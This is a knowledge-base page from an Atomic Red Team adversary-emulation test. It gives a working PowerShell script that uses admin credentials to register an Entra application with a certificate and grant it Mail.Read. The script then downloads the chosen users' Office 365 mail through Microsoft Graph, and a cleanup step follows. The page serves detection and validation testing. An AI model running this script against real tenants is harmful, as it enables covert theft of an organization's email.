---
atomic_guid: "36657d95-d9d6-4fbf-8a31-f4085607bafd"
title: "Office365 - Remote Mail Collected"
framework: "atomic"
generated: "true"
attack_technique_id: "T1114.002"
attack_technique_name: "Email Collection: Remote Email Collection"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.002/T1114.002.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "36657d95-d9d6-4fbf-8a31-f4085607bafd"
  - "Office365 - Remote Mail Collected"
platforms:
  - "office-365"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Office365 - Remote Mail Collected

Create and register an entra application that downloads emails from a tenant's Office 365 mailboxes using the Microsoft Graph API app-only access. This can be used by an adversary to collect an organization's sensitive information.

## Metadata

- Atomic GUID: 36657d95-d9d6-4fbf-8a31-f4085607bafd
- Technique: T1114.002: Email Collection: Remote Email Collection
- Platforms: office-365
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1114.002/T1114.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1114-email_collection|T1114.002]]

## Input Arguments

### 1st_target_mailbox

- description: office-365 target_email_address
- type: string

### 2nd_target_mailbox

- description: office-365 target_email_address
- type: string

### 3rd_target_mailbox

- description: office-365 target_email_address
- type: string

### password

- description: Entra user password
- type: string

### username

- description: Full username (including @domain) of Entra user w/ AppRoleassignment.ReadWrite.All and Application.ReadWrite.All Scope (eg, Global Administrator Role) and sign-in method is password
- type: string

## Dependencies

Microsoft Graph PowerShell SDK must be installed.

### Prerequisite Check

```text
$RequiredModule = Get-InstalledModule Microsoft.Graph
if (-not $RequiredModule) {exit 1} else {exit 0}
```

### Get Prerequisite

```text
Install-Module Microsoft.Graph -Scope CurrentUser
```

Az.Accounts module must be installed.

### Prerequisite Check

```text
$RequiredModule2 = Get-InstalledModule Az.Accounts
if (-not $RequiredModule2) {exit 1} else {exit 0}
```

### Get Prerequisite

```text
Install-Module Az.Accounts -Scope CurrentUser
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$ss = ConvertTo-SecureString "#{password}" -AsPlainText -Force
$cred = New-Object PSCredential -ArgumentList '#{username}', $ss
$param = @{
    Credential = $cred
    Force      = $true
}
$null = Connect-AzAccount @param
$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token
$cert = New-SelfSignedCertificate -Subject "CN=PowerShell Application" -CertStoreLocation "Cert:\CurrentUser\My" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256
$reqResourceAccess = ( @{ "resourceAccess" = (@{"id"= "570282fd-fa5c-430d-a7fd-fc8dc98a9dca"; "type"= "Scope"}, @{ "id"= "7427e0e9-2fba-42fe-b0c0-848c9e6a8182"; "type"= "Scope"}, @{"id"= "37f7f235-527c-4136-accd-4a02d197296e"; "type"= "Scope"}, @{"id"= "14dad69e-099b-42c9-810b-d002981feec1"; "type"= "Scope"}, @{ "id"= "e1fe6dd8-ba31-4d61-89e7-88639da4683d"; "type"= "Scope"}, @{ "id"= "810c84a8-4a9e-49e6-bf7d-12d183f40d01"; "type"= "Role"}); "resourceAppId" = "00000003-0000-0000-c000-000000000000" })
connect-mggraph -AccessToken $token
$context = Get-MgContext       
$users = get-MgUser
$app = New-MgApplication -DisplayName "T1114.002 Atomic Test #1 - Office365 - Remote Email Collection" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris="http://localhost"; } -KeyCredentials @(@{ Type="AsymmetricX509Cert"; Usage="Verify"; Key=$cert.RawData })
New-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null
$resourceSPN = Get-MgServicePrincipal -Filter "AppId eq '$($app.AppId)'"
$graphApiApp = Get-MgServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"
$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq "Mail.Read"
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id
$mailbox1 = "#{1st_target_mailbox}"
$mailbox2 = "#{2nd_target_mailbox}"
$mailbox3 = "#{3rd_target_mailbox}"
[System.Collections.ArrayList]$selectUsers = @()
foreach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}
connect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name
foreach ($user in $selectUsers) { $url= "https://graph.microsoft.com/v1.0/users/$($user)/messages" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}
```

### Cleanup

```powershell
connect-mggraph -Scopes AppRoleAssignment.ReadWrite.All,Application.ReadWrite.All,User.Read -NoWelcome
Remove-MgApplication $app.AppId
Remove-Item -Path Cert:\CurrentUser\My\$($cert.thumbprint) -DeleteKey
Disconnect-MgGraph
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.002/T1114.002.yaml)
